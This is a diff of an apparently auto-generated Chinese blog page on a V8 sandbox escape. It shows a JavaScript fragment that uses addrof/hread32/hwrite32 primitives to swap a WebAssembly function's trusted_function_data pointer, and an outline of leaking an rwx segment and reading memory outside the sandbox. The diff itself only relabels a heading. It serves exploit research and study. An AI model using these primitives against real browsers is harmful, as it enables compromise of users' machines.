@@ -226,10 +226,10 @@
 <h4 id="trusted-function-data替换"><a href="#trusted-function-data替换" class="headerlink" title="trusted_function_data替换"></a>trusted_function_data替换</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">let</span> write64SFI = <span class="title function_">hread32</span>(<span class="title function_">addrof</span>(wasmWrite64) + <span class="number">0x14</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> write64StructSFI = <span class="title function_">hread32</span>(<span class="title function_">addrof</span>(wasmWrite64Struct) + <span class="number">0x14</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> write64StructTFD = <span class="title function_">hread32</span>(write64StructSFI + <span class="number">0x4</span>);</span><br><span class="line"><span class="title function_">hwrite32</span>(write64SFI + <span class="number">0x4</span>, write64StructTFD);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <p>通过特定偏移获取<code>SharedFunctionInfo</code>中的<code>trused_function_data</code>指针。将<code>write64</code>的指针替换为<code>write64struct</code>的指针。总体来看，POC逻辑还是比较简单的。</p>
-<h2 id="Leak-amp-AAW"><a href="#Leak-amp-AAW" class="headerlink" title="Leak &amp; AAW"></a>Leak &amp; AAW</h2><p>我们已经有了沙盒外的任意地址写，接下来还需要:</p>
+<h2 id="Leak-amp-AAR"><a href="#Leak-amp-AAR" class="headerlink" title="Leak &amp; AAR"></a>Leak &amp; AAR</h2><p>我们已经有了沙盒外的任意地址写，接下来还需要:</p>
 <ul>
 <li>rwx段的地址泄露</li>
-<li>沙盒外的AAW任意地址读</li>
+<li>沙盒外的AAR任意地址读</li>
 </ul>
 <h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><p>有了之前的基础，我们很容易就想到：<strong>将多参数函数与无参函数混淆便可进行内存泄露</strong></p>
 <p>WAT实现：</p>
